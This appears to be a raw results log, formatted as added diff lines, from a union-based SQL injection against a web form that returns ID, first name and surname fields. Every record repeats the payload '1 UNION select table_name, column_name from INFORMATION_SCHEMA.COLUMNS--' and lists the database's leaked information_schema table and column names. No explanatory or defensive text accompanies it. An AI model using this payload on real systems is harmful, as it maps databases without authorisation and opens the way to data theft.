+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_STATISTICS
+Surname : ROWS_INSERTED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_STATISTICS
+Surname : ROWS_UPDATED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_STATISTICS
+Surname : SELECT_COMMANDS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_STATISTICS
+Surname : UPDATE_COMMANDS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_STATISTICS
+Surname : OTHER_COMMANDS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_STATISTICS
+Surname : COMMIT_TRANSACTIONS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_STATISTICS
+Surname : ROLLBACK_TRANSACTIONS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_STATISTICS
+Surname : DENIED_CONNECTIONS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_STATISTICS
+Surname : LOST_CONNECTIONS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_STATISTICS
+Surname : ACCESS_DENIED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: USER_STATISTICS
+Surname : EMPTY_QUERIES
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: VIEWS
+Surname : TABLE_CATALOG
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: VIEWS
+Surname : TABLE_SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: VIEWS
+Surname : TABLE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: VIEWS
+Surname : VIEW_DEFINITION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: VIEWS
+Surname : CHECK_OPTION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: VIEWS
+Surname : IS_UPDATABLE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: VIEWS
+Surname : DEFINER
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: VIEWS
+Surname : SECURITY_TYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: VIEWS
+Surname : CHARACTER_SET_CLIENT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: VIEWS
+Surname : COLLATION_CONNECTION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CMPMEM_RESET
+Surname : page_size
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CMPMEM_RESET
+Surname : buffer_pool_instance
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CMPMEM_RESET
+Surname : pages_used
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CMPMEM_RESET
+Surname : pages_free
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CMPMEM_RESET
+Surname : relocation_ops
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CMPMEM_RESET
+Surname : relocation_time
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_RSEG
+Surname : rseg_id
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_RSEG
+Surname : space_id
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_RSEG
+Surname : zip_size
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_RSEG
+Surname : page_no
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_RSEG
+Surname : max_size
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_RSEG
+Surname : curr_size
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_UNDO_LOGS
+Surname : trx_id
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_UNDO_LOGS
+Surname : rseg_id
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_UNDO_LOGS
+Surname : useg_id
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_UNDO_LOGS
+Surname : type
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_UNDO_LOGS
+Surname : state
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_UNDO_LOGS
+Surname : size
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CMPMEM
+Surname : page_size
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CMPMEM
+Surname : buffer_pool_instance
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CMPMEM
+Surname : pages_used
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CMPMEM
+Surname : pages_free
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CMPMEM
+Surname : relocation_ops
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CMPMEM
+Surname : relocation_time
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_TABLESTATS
+Surname : TABLE_ID
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_TABLESTATS
+Surname : SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_TABLESTATS
+Surname : NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_TABLESTATS
+Surname : STATS_INITIALIZED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_TABLESTATS
+Surname : NUM_ROWS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_TABLESTATS
+Surname : CLUST_INDEX_SIZE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_TABLESTATS
+Surname : OTHER_INDEX_SIZE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_TABLESTATS
+Surname : MODIFIED_COUNTER
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_TABLESTATS
+Surname : AUTOINC
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_TABLESTATS
+Surname : MYSQL_HANDLES_OPENED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_LOCK_WAITS
+Surname : requesting_trx_id
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_LOCK_WAITS
+Surname : requested_lock_id
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_LOCK_WAITS
+Surname : blocking_trx_id
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_LOCK_WAITS
+Surname : blocking_lock_id
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_INDEX_STATS
+Surname : table_schema
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_INDEX_STATS
+Surname : table_name
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_INDEX_STATS
+Surname : index_name
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_INDEX_STATS
+Surname : fields
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_INDEX_STATS
+Surname : rows_per_key
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_INDEX_STATS
+Surname : index_total_pages
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_INDEX_STATS
+Surname : index_leaf_pages
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CMP
+Surname : page_size
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CMP
+Surname : compress_ops
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CMP
+Surname : compress_ops_ok
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CMP
+Surname : compress_time
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CMP
+Surname : uncompress_ops
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CMP
+Surname : uncompress_time
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CMP_RESET
+Surname : page_size
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CMP_RESET
+Surname : compress_ops
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CMP_RESET
+Surname : compress_ops_ok
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CMP_RESET
+Surname : compress_time
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CMP_RESET
+Surname : uncompress_ops
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CMP_RESET
+Surname : uncompress_time
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CHANGED_PAGES
+Surname : space_id
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CHANGED_PAGES
+Surname : page_id
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CHANGED_PAGES
+Surname : start_lsn
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_CHANGED_PAGES
+Surname : end_lsn
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES
+Surname : page_type
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES
+Surname : space_id
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES
+Surname : page_no
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES
+Surname : lru_position
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES
+Surname : fix_count
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES
+Surname : flush_type
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TRX
+Surname : trx_id
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TRX
+Surname : trx_state
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TRX
+Surname : trx_started
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TRX
+Surname : trx_requested_lock_id
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TRX
+Surname : trx_wait_started
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TRX
+Surname : trx_weight
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TRX
+Surname : trx_mysql_thread_id
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TRX
+Surname : trx_query
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TRX
+Surname : trx_operation_state
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TRX
+Surname : trx_tables_in_use
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TRX
+Surname : trx_tables_locked
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TRX
+Surname : trx_lock_structs
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TRX
+Surname : trx_lock_memory_bytes
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TRX
+Surname : trx_rows_locked
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TRX
+Surname : trx_rows_modified
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TRX
+Surname : trx_concurrency_tickets
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TRX
+Surname : trx_isolation_level
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TRX
+Surname : trx_unique_checks
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TRX
+Surname : trx_foreign_key_checks
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TRX
+Surname : trx_last_foreign_key_error
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TRX
+Surname : trx_adaptive_hash_latched
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TRX
+Surname : trx_adaptive_hash_timeout
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES_INDEX
+Surname : index_id
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES_INDEX
+Surname : space_id
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES_INDEX
+Surname : page_no
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES_INDEX
+Surname : n_recs
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES_INDEX
+Surname : data_size
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES_INDEX
+Surname : hashed
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES_INDEX
+Surname : access_time
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES_INDEX
+Surname : modified
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES_INDEX
+Surname : dirty
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES_INDEX
+Surname : old
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES_INDEX
+Surname : lru_position
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES_INDEX
+Surname : fix_count
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES_INDEX
+Surname : flush_type
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_LOCKS
+Surname : lock_id
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_LOCKS
+Surname : lock_trx_id
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_LOCKS
+Surname : lock_mode
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_LOCKS
+Surname : lock_type
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_LOCKS
+Surname : lock_table
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_LOCKS
+Surname : lock_index
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_LOCKS
+Surname : lock_space
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_LOCKS
+Surname : lock_page
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_LOCKS
+Surname : lock_rec
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_LOCKS
+Surname : lock_data
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES_BLOB
+Surname : space_id
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES_BLOB
+Surname : page_no
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES_BLOB
+Surname : compressed
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES_BLOB
+Surname : part_len
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES_BLOB
+Surname : next_page_no
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES_BLOB
+Surname : lru_position
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES_BLOB
+Surname : fix_count
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_POOL_PAGES_BLOB
+Surname : flush_type
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_TABLES
+Surname : TABLE_ID
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_TABLES
+Surname : SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_TABLES
+Surname : NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_TABLES
+Surname : FLAG
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_TABLES
+Surname : N_COLS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_TABLES
+Surname : SPACE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_FIELDS
+Surname : INDEX_ID
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_FIELDS
+Surname : NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_FIELDS
+Surname : POS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_COLUMNS
+Surname : TABLE_ID
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_COLUMNS
+Surname : NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_COLUMNS
+Surname : POS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_COLUMNS
+Surname : MTYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_COLUMNS
+Surname : PRTYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_COLUMNS
+Surname : LEN
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_STATS
+Surname : INDEX_ID
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_STATS
+Surname : KEY_COLS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_STATS
+Surname : DIFF_VALS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_STATS
+Surname : NON_NULL_VALS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: QUERY_CACHE_INFO
+Surname : STATEMENT_SCHEMA
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: QUERY_CACHE_INFO
+Surname : STATEMENT_TEXT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: QUERY_CACHE_INFO
+Surname : RESULT_BLOCKS_COUNT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: QUERY_CACHE_INFO
+Surname : RESULT_BLOCKS_SIZE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: QUERY_CACHE_INFO
+Surname : RESULT_BLOCKS_SIZE_USED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_INDEXES
+Surname : INDEX_ID
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_INDEXES
+Surname : NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_INDEXES
+Surname : TABLE_ID
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_INDEXES
+Surname : TYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_INDEXES
+Surname : N_FIELDS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_INDEXES
+Surname : PAGE_NO
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_INDEXES
+Surname : SPACE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: XTRADB_ADMIN_COMMAND
+Surname : result_message
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TABLE_STATS
+Surname : table_schema
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TABLE_STATS
+Surname : table_name
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TABLE_STATS
+Surname : rows
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TABLE_STATS
+Surname : clust_size
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TABLE_STATS
+Surname : other_size
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_TABLE_STATS
+Surname : modified
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_FOREIGN_COLS
+Surname : ID
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_FOREIGN_COLS
+Surname : FOR_COL_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_FOREIGN_COLS
+Surname : REF_COL_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_SYS_FOREIGN_COLS
+Surname : POS
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE_LRU
+Surname : POOL_ID
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE_LRU
+Surname : LRU_POSITION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE_LRU
+Surname : SPACE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE_LRU
+Surname : PAGE_NUMBER
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE_LRU
+Surname : PAGE_TYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE_LRU
+Surname : FLUSH_TYPE
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE_LRU
+Surname : FIX_COUNT
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE_LRU
+Surname : IS_HASHED
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE_LRU
+Surname : NEWEST_MODIFICATION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE_LRU
+Surname : OLDEST_MODIFICATION
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE_LRU
+Surname : ACCESS_TIME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE_LRU
+Surname : TABLE_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE_LRU
+Surname : INDEX_NAME
+
+ID: 1 UNION select table_name, column_name from INFORMATION_SCHEMA.COLUMNS-- 
+First name: INNODB_BUFFER_PAGE_LRU
+Surname : NUMBER_RECORDS
+
